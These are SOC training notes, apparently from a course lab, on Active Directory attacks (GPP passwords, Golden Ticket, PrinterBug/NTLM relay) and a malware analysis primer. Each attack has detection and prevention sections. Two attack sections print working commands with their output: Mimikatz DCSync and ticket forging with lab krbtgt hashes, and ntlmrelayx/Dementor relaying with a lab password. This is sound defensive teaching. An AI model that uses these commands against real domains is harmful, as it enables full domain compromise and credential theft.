![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7f0a2d39-1f27-4312-a503-4ecc56670f44)

### Prevention

Once the encryption key was made public and started to become abused, Microsoft released a patch (KB2962486) in 2014 to prevent caching credentials in GPP. Therefore, GPP should no longer store passwords in new patched environments. However, unfortunately, there are a multitude of Active Directory environments built after 2015, which for some reason, do contain credentials in SYSVOL. It is therefore highly recommended to continuously assess and review the environment to ensure that no credentials are exposed here.

It is crucial to know that if an organization built its AD environment before 2014, it is likely that its credentials are still cached because the patch does not clear existing stored credentials (only prevents the caching of new ones).

### Detection

**There are two detection techniques for this attack:**
- Accessing the XML file containing the credentials should be a red flag if we are auditing file access; this is more realistic (due to volume otherwise) regarding detection if it is a dummy XML file, not associated with any GPO. In this case, there will be no reason for anyone to touch this file, and any attempt is likely suspicious. As demonstrated by Get-GPPPasswords, it parses all of the XML files in the Policies folder. For auditing, we can generate an event whenever a user reads the file:


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d81f46fc-70e5-4ae8-b97d-2970ea381a1b)


**Once auditing is enabled, any access to the file will generate an Event with the ID 4663:**


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e9dcad32-bd93-4d73-b69d-8d341d580830)

- Logon attempts (failed or successful, depending on whether the password is up to date) of the user whose credentials are exposed is another way of detecting the abuse of this attack; this should generate one of the events 4624 (successful logon), 4625 (failed logon), or 4768 (TGT requested). A successful logon with the account from our attack scenario would generate the following event on the Domain Controller:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c5560cda-b5d3-43e6-9904-eb3c7ca3a505)


In the case of a service account, we may correlate logon attempts with the device from which the authentication attempt originates, as this should be easy to detect, assuming we know where certain accounts are used (primarily if the logon originated from a workstation, which is abnormal behavior for a service account).

### Honeypot
This attack provides an excellent opportunity for setting up a trap: we can use a semi-privileged user with a wrong password. Service accounts provide a more realistic opportunity because:

- The password is usually expected to be old, without recent or regular modifications.
- It is easy to ensure that the last password change is older than when the GPP XML file was last modified. If the user's password is changed after the file was modified, then no adversary will attempt to login with this account (the password is likely no longer valid).
- Schedule the user to perform any dummy task to ensure that there are recent logon attempts.

When we do the above, we can configure an alert that if any successful or failed logon attempts occur with this service account, it must be malicious (assuming that we whitelist the dummy task logon that simulates the logon activity in the alert).

Because the provided password is wrong, we would primarily expect failed logon attempts. Three event IDs (4625, 4771, and 4776) can indicate this; here is how they look for our playground environment if an attacker is attempting to authenticate with a wrong password:

- 4625

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9ba6a737-a11e-4ccf-a17d-32d59a8238d9)

- 4771

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/1302456e-634e-431e-88cd-fac32f9883fe)

- 4776 
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/8043b2c9-177f-4975-8043-82a959a5d30f)


## Golden Ticket Attack 

### Descriptions 

The Kerberos Golden Ticket is an attack in which threat agents can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.

When a Domain is created, the unique user account krbtgt is created by default; krbtgt is a disabled account that cannot be deleted, renamed, or enabled. The Domain Controller's KDC service will use the password of krbtgt to derive a key with which it signs all Kerberos tickets. This password's hash is the most trusted object in the entire Domain because it is how objects guarantee that the environment's Domain issued Kerberos tickets.

Therefore, any user possessing the password's hash of krbtgt can create valid Kerberos TGTs. Because krbtgt signs them, forged TGTs are considered valid tickets within an environment. Previously, it was even possible to create TGTs for inexistent users and assign any privileges to their accounts. Because the password's hash of krbtgt signs these tickets, the entire domain blindly trusts them, behaving as if the user(s) existed and possessed the privileges inscribed in the ticket.

The Golden Ticket attack allows us to escalate rights from any child domain to the parent in the same forest. Therefore, we can escalate to the production domain from any test domain we may have, as the domain is not a security boundary.

This attack provides means for elevated persistence in the domain. It occurs after an adversary has gained Domain Admin (or similar) privileges.


### Attack 
To perform the Golden Ticket attack, we can use Mimikatz with the following arguments:

- /domain: The domain's name.
- /sid: The domain's SID value.
- /rc4: The password's hash of krbtgt.
- /user: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)
- /id: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.

Additionally, advanced threat agents mostly will specify values for the /renewmax and /endin arguments, as otherwise, Mimikatz will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by EDRs:

- /renewmax: The maximum number of days the ticket can be renewed.
- /endin: End-of-life for the ticket.

First, we need to obtain the password's hash of krbtgt and the SID value of the Domain. We can utilize DCSync with Rocky's account from the previous attack to obtain the hash:

```
C:\WINDOWS\system32>cd ../../../

C:\>cd Mimikatz

C:\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 07/08/2022 11.26.54
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: db0d0630064747072a7da3f7c3b4069e
    ntlm- 0: db0d0630064747072a7da3f7c3b4069e
    lm  - 0: f298134aa1b3627f4b162df101be7ef9

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b21cfadaca7a3ab774f0b4aea0d7797f

* Primary:Kerberos-Newer-Keys *
    Default Salt : EAGLE.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
      aes128_hmac       (4096) : 8ca6bbd37b3bfb692a3cfaf68c579e64
      des_cbc_md5       (4096) : 580229010b15b52f

* Primary:Kerberos *
    Default Salt : EAGLE.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 580229010b15b52f

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  b4799f361e20c69c6fc83b9253553f3f
    02  510680d277587431b476c35e5f56e6b6
    03  7f55d426cc922e24269610612c9205aa
    04  b4799f361e20c69c6fc83b9253553f3f
    05  510680d277587431b476c35e5f56e6b6
    06  5fe31b1339791ab90043dbcbdf2fba02
    07  b4799f361e20c69c6fc83b9253553f3f
    08  7e08c14bc481e738910ba4d43b96803b
    09  7e08c14bc481e738910ba4d43b96803b
    10  b06fca48286ef6b1f6fb05f08248e6d7
    11  20f1565a063bb0d0ef7c819fa52f4fae
    12  7e08c14bc481e738910ba4d43b96803b
    13  b5181b744e0e9f7cc03435c069003e96
    14  20f1565a063bb0d0ef7c819fa52f4fae
    15  1aef9b5b268b8922a1e5cc11ed0c53f6
    16  1aef9b5b268b8922a1e5cc11ed0c53f6
    17  cd03f233b0aa1b39689e60dd4dbf6832
    18  ab6be1b7fd2ce7d8267943c464ee0673
    19  1c3610dce7d73451d535a065fc7cc730
    20  aeb364654402f52deb0b09f7e3fad531
    21  c177101f066186f80a5c3c97069ef845
    22  c177101f066186f80a5c3c97069ef845
    23  2f61531cee8cab3bb561b1bb4699cb9b
    24  bc35f896383f7c4366a5ce5cf3339856
    25  bc35f896383f7c4366a5ce5cf3339856
    26  b554ba9e2ce654832edf7a26cc24b22d
    27  f9daef80f97eead7b10d973f31c9caf4
    28  1cf0b20c5df52489f57e295e51034e97
    29  8c6049c719db31542c759b59bc671b9c
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d90037cb-80ac-4d66-a23d-55fa752d022f)

We will use the Get-DomainSID function from PowerView to obtain the SID value of the Domain:

Link PowerView.ps1 : https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

```
PS C:\Users\bob\Downloads> powershell -exec bypass

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\bob\Downloads> . .\PowerView.ps1
PS C:\Users\bob\Downloads> Get-DomainSID
S-1-5-21-1518138621-4282902758-752445584
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/2f12c2aa-0e00-4954-92e6-d980dbd757f7)

Now, armed with all the required information, we can use Mimikatz to create a ticket for the account Administrator. The /ptt argument makes Mimikatz


```
C:\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

User      : Administrator
Domain    : eagle.local (EAGLE)
SID       : S-1-5-21-1518138621-4282902758-752445584
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: db0d0630064747072a7da3f7c3b4069e - rc4_hmac_nt
Lifetime  : 13/10/2022 06.28.43 ; 13/10/2022 06.36.43 ; 13/10/2022 06.35.43
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ eagle.local' successfully submitted for current session
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/61b9f5a8-7fd4-41b9-b82f-a3b64a8826ae)

The output shows that Mimikatz injected the ticket in the current session, and we can verify that by running the command klist (after exiting from Mimikatz):

```
mimikatz # exit

Bye!

C:\Mimikatz>klist

Current LogonId is 0:0x9cbd6

Cached Tickets: (1)

#0>     Client: Administrator @ eagle.local
        Server: krbtgt/eagle.local @ eagle.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 10/13/2022 13/10/2022 06.28.43 (local)
        End Time:   10/13/2022 13/10/2022 06.36.43 (local)
        Renew Time: 10/13/2022 13/10/2022 06.35.43 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

```
C:\Mimikatz>dir \\dc1\c$

 Volume in drive \\dc1\c$ has no label.
 Volume Serial Number is 2CD0-9665

 Directory of \\dc1\c$

15/10/2022  08.30    <DIR>          DFSReports
13/10/2022  13.23    <DIR>          Mimikatz
01/09/2022  11.49    <DIR>          PerfLogs
28/11/2022  01.59    <DIR>          Program Files
01/09/2022  04.02    <DIR>          Program Files (x86)
13/12/2022  02.22    <DIR>          scripts
07/08/2022  11.31    <DIR>          Users
28/11/2022  02.27    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  44.947.984.384 bytes free
```

### Prevention for Golden Ticket 

Preventing the creation of forged tickets is difficult as the KDC generates valid tickets using the same procedure. Therefore, once an attacker has all the required information, they can forge a ticket. Nonetheless, there are a few things we can and should do:

- Block privileged users from authenticating to any device.
- Periodically reset the password of the krbtgt account; the secrecy of this hash value is crucial to Active Directory. When resetting the password of krbtgt (regardless of the password's strength), it will always be overwritten with a new randomly generated and cryptographically secure one. Utilizing Microsoft's script for changing the password of krbtgt KrbtgtKeys.ps1 is highly recommended as it has an audit mode that checks the domain for preventing impacts upon password change. It also forces DC replication across the globe so all Domain Controllers sync the new value instantly, reducing potential business disruptions.

Link to KrbtgtKeys.ps1 : https://github.com/microsoftarchive/New-KrbtgtKeys.ps1

- Enforce SIDHistory filtering between the domains in forests to prevent the escalation from a child domain to a parent domain (because the escalation path involves abusing the SIDHistory property by setting it to that of a privileged group, for example, Enterprise Admins). However, doing this may result in potential issues in migrating domains.

### Detection
Correlating users' behavior is the best technique to detect abuse of forged tickets. Suppose we know the location and time a user regularly uses to log in. In that case, it will be easy to alert on other (suspicious) behaviors—for example, consider the account 'Administrator' in the attack described above. If a mature organization uses Privileged Access Workstations (PAWs), they should be alert to any privileged users not authenticating from those machines, proactively monitoring events with the ID 4624 and 4625 (successful and failed logon).

Domain Controllers will not log events when a threat agent forges a Golden Ticket from a compromised machine. However, when attempting to access another system(s), we will see events for successful logon originating from the compromised machine:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f3b648dd-0578-4460-9143-fb243f55fffe)

Another detection point could be a TGS service requested for a user without a previous TGT. However, this can be a tedious task due to the sheer volume of tickets (and many other factors). If we go back to the attack scenario, by running dir \\dc1\c$ at the end, we generated two TGS tickets on the Domain Controller:

**Ticket 1:**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/37726a61-fd91-4207-bb11-d3b20c5a6443)


**Ticket 2**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/743010a7-b1a9-47ce-99ac-8963cf8be49d)

The only difference between the tickets is the service. However, they are ordinary compared to the same events not associated with the Golden Ticket.

If SID filtering is enabled, we will get alerts with the event ID 4675 during cross-domain escalation.

> [!TIP]
> Note

If an Active Directory forest has been compromised, we need to reset all users' passwords and revoke all certificates, and for krbtgt, we must reset its password twice (in every domain). The password history value for the krbtgt account is 2. Therefore it stores the two most recent passwords. By resetting the password twice, we effectively clear any old passwords from the history, so there is no way another DC will replicate this DC by using an old password. However, it is recommended that this password reset occur at least 10 hours apart from each other (maximum user ticket lifetime); otherwise, expect some services to break if done in a shorter period.



## Print Spooler & NTLM Relaying 

### Descriptions

The Print Spooler is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, Lee Christensen found the PrinterBug. The functions RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a TGT. Therefore, any domain user can coerce RemoteServer$ to authenticate to any machine. Microsoft's stance on the PrinterBug was that it will not be fixed, as the issue is "by-design".

The impact of PrinterBug is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:

- Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
- Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
- Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
- Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.

### Attack 
In this attack path, we will relay the connection to another DC and perform DCSync (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.

To begin, we will configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack:


```
$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/693fd4e3-4b7a-45d6-8e10-44bab3ee79eb)

Next, we need to trigger the PrinterBug using the Kali box with NTLMRelayx listening. To trigger the connection back, we'll use Dementor (when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously compromised Bob):

Link to Dementor : https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py

```
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

[*] connecting to 172.16.18.3
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
[*] done!
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/bbd238d4-26e7-4c9b-819e-10fcab7e1c62)

Now, switching back to the terminal session with NTLMRelayx, we will see that DCSync was successful:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/107550f0-caff-4ab1-b527-12afea82709d)


### Prevention

Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.

Additionally, there is an option to prevent the abuse of the PrinterBug while keeping the service running: when disabling the registry key RegisterSpoolerRemoteRpcEndPoint, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6b143c7c-e6af-4da0-969a-847a8ca92122)


### Detection

Exploiting the PrinterBug will leave traces of network connections toward the Domain Controller; however, they are too generic to be used as a detection mechanism.

In the case of using NTLMRelayx to perform DCSync, no event ID 4662 is generated (as mentioned in the DCSync section); however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1. This event originates from the IP address of the Kali machine, not the Domain Controller, as we can see below:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/cc3a1e1a-3b29-4fe6-91ce-88a76af77982)


A suitable detection mechanism always correlates all logon attempts from core infrastructure servers to their respective IP addresses (which should be static and known).


### Honeypot
It is possible to use the PrinterBug as means of alerting on suspicious behavior in the environment. In this scenario, we would block outbound connections from our servers to ports 139 and 445; software or physical firewalls can achieve this. Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent. However, those blocked connections will act as signs of compromise for the blue team. Before enforcing anything related to this exploit, we should ensure that we have sufficient logs and knowledge of our environment to ensure that legitimate connections are allowed (for example, we must keep the mentioned ports open between DCs, so that they can replicate data).

While this may seem suitable for a honeypot to trick adversaries, we should be careful before implementing it, as currently, the bug requires the machine to connect back to us, but if a new unknown bug is discovered, which allows for some type of Remote Code Execution without the reverse connection, then this will backfire on us. Therefore, we should only consider this option if we are an extremely mature organization and can promptly act on alerts and disable the service on all devices should a new bug be discovered.


# Malware Analysis : 
> [!NOTE]
> It is essential to clarify that this module does not claim to be an all-encompassing or exhaustive program on Malware Analysis. This module provides a robust foundation for SOC analysts, enabling them to confidently tackle key Malware Analysis tasks. The primary focus of the module will be the analysis of malware targeting the Windows Operating System.

### Malware Definition

Malware, short for malicious software, is a term encompassing various types of software designed to infiltrate, exploit, or damage computer systems, networks, and data.

Although all malware is utilized for malicious intents, the specific objectives of malware can vary among different threat actors. These objectives commonly fall into several categories:

- Disrupting host system operations
- Stealing critical information, including personal and financial data
- Gaining unauthorized access to systems
- Conducting espionage activities
- Sending spam messages
- Utilizing the victim's system for Distributed Denial of Service (DDoS) attacks
- Implementing ransomware to lock up victim's files on their host and demanding ransom

## Malware Types

In today's fast-paced world of cyber threats, we find ourselves up against a broad spectrum of complex and varied malware forms, which pose a relentless challenge to our cyber defenses. It's paramount for us to grasp the multifaceted nature of malicious software as we endeavor to bolster the security of our systems and networks. Let's peel back the layers of some commonly seen types of malware that we frequently grapple with in our cybersecurity endeavors.

- Virus: These notorious forms of malware are designed to infiltrate and multiply within host files, transitioning from one system to another. They latch onto credible programs, springing into action when the infected files are triggered. Their destructive powers can range from corrupting or altering data to disrupting system functions, and even spreading through networks, inflicting widespread havoc.

- Worms: Worms are autonomous malware capable of multiplying across networks without needing human intervention. They exploit network weaknesses to infiltrate systems without permission. Once inside, they can either deliver damaging payloads or keep multiplying to other vulnerable devices. Worms can initiate swift and escalating infections, resulting in enormous disruption and even potential denial of service attacks.

- Trojans: Also known as Trojan Horses, these are disguised as genuine software to trick users into running them. Upon entering a system, they craft backdoors, allowing attackers to gain unauthorized control remotely. Trojans can be weaponized to pilfer sensitive data, such as passwords or financial information, and orchestrate other harmful activities on the compromised system.

- Ransomware: This malicious type of malware encrypts files on the target's system, making them unreachable. Attackers then demand a ransom in return for the decryption key, effectively holding the victim's data to ransom. The impacts of ransomware attacks can debilitate organizations and individuals alike, leading to severe financial and reputational harm.

- Spyware: This type of malware stealthily gathers sensitive data and user activities without their consent. It can track online browsing habits, record keystrokes, and capture login credentials, posing a severe risk to privacy and security. The pilfered data is often sent to remote servers for harmful purposes.

- Adware: Though not as destructive, adware can still be an annoyance and a security threat. It shows uninvited and invasive advertisements on infected systems, often resulting in a poor user experience. Adware may also track user behavior and collect data for targeted advertising.

- Botnets: These are networks of compromised devices, often referred to as bots or zombies, controlled by a central command-and-control (C2) server. Botnets can be exploited for a variety of harmful activities, including launching DDoS attacks, spreading spam, or disseminating other malware.

- Rootkits: These are stealthy forms of malware designed to gain unauthorized access and control over the fundamental components (the "root") of an operating system. They alter system functions to conceal their presence, making them extremely challenging to spot and eliminate. Attackers can utilize rootkits to maintain prolonged access and dodge security protocols.

- Backdoors/RATs (Remote Access Trojans): Backdoors and RATs are crafted to offer unauthorized access and control over compromised systems from remote locations. Attackers can leverage them to retain prolonged control, extract data, or instigate additional attacks.

- Droppers: These are a kind of malware used to transport and install extra malicious payloads onto infected systems. They serve as a conduit for other malware, ensuring the covert installation and execution of more sophisticated threats.

- Information Stealers: These are tailored to target and extract sensitive data, like login credentials, personal information, or intellectual property, for harmful purposes. This includes identity theft or selling the data on the dark web.

These examples barely scratch the surface of the types of malware we confront in today's threat landscape. It's essential to remember that cybercriminals consistently refine their strategies, techniques, and malware variants to avoid detection and exploit new vulnerabilities.

### Malware Samples

When it comes to enhancing our cybersecurity defenses and understanding the threats that exist, sometimes we have to dive into the dark corners of the cyber world. This means getting our hands on actual malware samples, be it for research, analysis, or educational purposes. However, it's crucial to emphasize that dealing with real malware samples should be done in a safe and controlled environment to prevent accidental infections and potential harm. Here are some resources, both free and paid, where we can find such samples.


- VirusShare: An excellent resource for malware researchers, VirusShare houses a vast collection of malware samples. They currently have over 30 million samples in their repository, all of which are freely available to the public.
- Hybrid Analysis: This website allows us to submit files for malware analysis. However, they also have a public feed of their analyses, where malware samples are often shared.
- TheZoo: A GitHub repository that contains a collection of live malware for analysis and education. The repository also contains additional information about each sample, such as its family and the type of activities it performs.
- Malware-Traffic-Analysis.net: This website provides traffic analysis exercises that can be extremely beneficial for people trying to learn about malware traffic patterns. They often provide pcap files of actual malware traffic, which can be quite informative.
- VirusTotal: VirusTotal inspects items with over 70 antivirus scanners and URL/domain blocklisting services, in addition to a myriad of tools to extract signals from the studied content. Any user can select a file from their computer using their browser and send it to VirusTotal. VirusTotal offers a number of file submission methods, including the primary public web interface, desktop uploaders, browser extensions and a programmatic API.
- ANY.RUN: An interactive online sandbox for malware analysis. The service allows researchers to analyze malware behavior by running samples in a controlled environment. While it offers both free and paid tiers, even the free version provides access to public submissions, which can include various malware samples.
- Contagio Malware Dump: Contagio Dump is a collection of malware samples, threat reports, and related resources curated by a malware researcher named Mila. The site provides direct, anonymized access to an extensive range of malware samples, including various types of trojans, worms, ransomware, and exploits. It's frequently used by security researchers and analysts to study malware behavior and develop mitigation techniques.
- VX Underground: VX-Underground is one of the largest collections of malware source code, articles, and papers on the internet. It aims to collect, preserve, and share all kinds of materials related to malware, exploit, and hacking culture. This resource is valuable to security researchers and enthusiasts who want to study malware construction and behavior from a more technical and code-centric perspective.

### Malware/Evidence Acquisition

When it comes to gathering evidence during a digital forensics investigation or incident response, having the right tools to perform disk imaging and memory acquisition is crucial. Let's discuss some free solutions we can use to collect the necessary data for our investigations.

### Disk Imaging Solutions

- FTK Imager: Developed by AccessData (now acquired by Exterro), FTK Imager is one of the most widely used disk imaging tools in the cybersecurity field. It allows us to create perfect copies (or images) of computer disks for analysis, preserving the integrity of the evidence. It also lets us view and analyze the contents of data storage devices without altering the data.
- OSFClone: A free, open-source utility designed for the task of creating and cloning forensic disk images. It's easy to use and supports a wide variety of file systems.
- DD and DCFLDD: Both are command-line utilities available on Unix-based systems (including Linux and MacOS). DD is a versatile tool included in most Unix-based systems by default, while DCFLDD is an enhanced version of DD with features specifically useful for forensics, such as hashing.

### Memory Acquisition Solutions

- DumpIt: A simplistic utility that generates a physical memory dump of Windows and Linux machines. On Windows, it concatenates 32-bit and 64-bit system physical memory into a single output file, making it extremely easy to use.
- MemDump: MemDump is a free, straightforward command-line utility that enables us to capture the contents of a system's RAM. It’s quite beneficial in forensics investigations or when analyzing a system for malicious activity. Its simplicity and ease of use make it a popular choice for memory acquisition.
- Belkasoft RAM Capturer: This is another powerful tool we can use for memory acquisition, provided free of charge by Belkasoft. It can capture the RAM of a running Windows computer, even if there's active anti-debugging or anti-dumping protection. This makes it a highly effective tool for extracting as much data as possible during a live forensics investigation.
- Magnet RAM Capture: Developed by Magnet Forensics, this tool provides a free and simple way to capture the volatile memory of a system.
- LiME (Linux Memory Extractor): LiME is a Loadable Kernel Module (LKM) which allows the acquisition of volatile memory. LiME is unique in that it's designed to be transparent to the target system, evading many common anti-forensic measures.

### Other Evidence Acquisition Solutions

- KAPE (Kroll Artifact Parser and Extractor): KAPE is a triage program designed to help in collecting and parsing artifacts in a quick and effective manner. It focuses on targeted collection, reducing the volume of collected data and the time required for analysis. KAPE is free for use and is an essential tool in our digital forensics toolkit.
- Velociraptor: Velociraptor is a versatile tool designed for host-based incident response and digital forensics. It allows for quick, targeted data collection across a wide number of machines. Velociraptor employs Velocidex Query Language (VQL), a powerful tool to collect and manipulate artifacts. The open-source nature of Velociraptor makes it a valuable free tool in our arsenal.

### Malware Analysis Definition, Purpose, & Common Activities

The process of comprehending the behavior and inner workings of malware is known as Malware Analysis, a crucial aspect of cybersecurity that aids in understanding the threat posed by malicious software and devising effective countermeasures.

In our pursuit of Malware Analysis, we delve into the malware's code, structure, and functionality to gain profound insights into its purpose, propagation methods, and potential impact on targeted systems. By answering pertinent questions, such as the type of malware (e.g., spybot, keylogger, ransomware), its intended behavior on endpoints, the aftermath of its execution (including generated artifacts on the network or endpoint and possible connections to Command and Control (C2) servers), the extent of damage it can inflict, its attribution to specific threat groups, and crafting detection rules based on the analysis to detect the malware across the entire network, we can devise robust defense mechanisms against these threats.

**Malware analysis serves several pivotal purposes, such as:**


- Detection and Classification: Through analyzing malware, we can identify and categorize different types of threats based on their unique characteristics, signatures, or patterns. This enables us to develop detection rules and empowers security professionals to gain a comprehensive understanding of the nature of the malware they encounter.

- Reverse Engineering: Malware analysis often involves the intricate process of reverse engineering the malware's code to discern its underlying operations and employed techniques. This can unveil concealed functionalities, encryption methods, details about the command-and-control infrastructure, and techniques used for obfuscation and evasion.

- Behavioral Analysis: By meticulously studying the behavior of malware during execution, we gain insights into its actions, such as modifications to the file system, network communications, changes to the system registry, and attempts to exploit vulnerabilities. This analysis provides invaluable information about the impact of the malware on infected systems and assists in devising potential countermeasures.

- Threat Intelligence: Through malware analysis, threat researchers can amass critical intelligence about attackers, their tactics, techniques, and procedures (TTPs), and the malware's origins. This valuable intelligence can be shared with the wider security community to enhance detection, prevention, and response capabilities.

**The techniques employed in malware analysis encompass a wide array of methods and tools, including:**

- Static Analysis: This approach involves scrutinizing the malware's code without executing it, examining the file structure, identifying strings, searching for known signatures, and studying metadata to gain preliminary insights into the malware's characteristics.

- Dynamic Analysis: Dynamic analysis entails executing the malware within a controlled environment, such as a sandbox or virtual machine, to observe its behavior and capture its runtime activities. This includes monitoring network traffic, system calls, file system modifications, and other interactions.

- Code Analysis: Code analysis (includes reverse engineering) and involves disassembling or decompiling the malware's code to understand its logic, functions, algorithms, and employed techniques. This helps in identifying concealed functionalities, exploitation methods, encryption methods, details about the command-and-control infrastructure, and techniques used for obfuscation and evasion. Ιnferentially, code analysis can also help in uncovering potential Indicators of Compromise (IOCs).

- Memory Analysis: Analyzing the malware's interactions with system memory helps in identifying injected code, hooks, or other runtime manipulations. This can be instrumental in detecting rootkits, analyzing anti-analysis techniques, or identifying malicious payloads.

- Malware Unpacking: This technique refers to the process of extracting and isolating the hidden malicious code within a piece of malware that uses packing techniques to evade detection. Packers are used by malware authors to compress, encrypt, or obfuscate their malicious code, making it harder for antivirus software and other security tools to identify the threat. Unpacking involves reverse-engineering these packing techniques to reveal the original, unobfuscated code for further analysis. This can allow researchers to understand the malware's functionality, behavior, and potential impact.

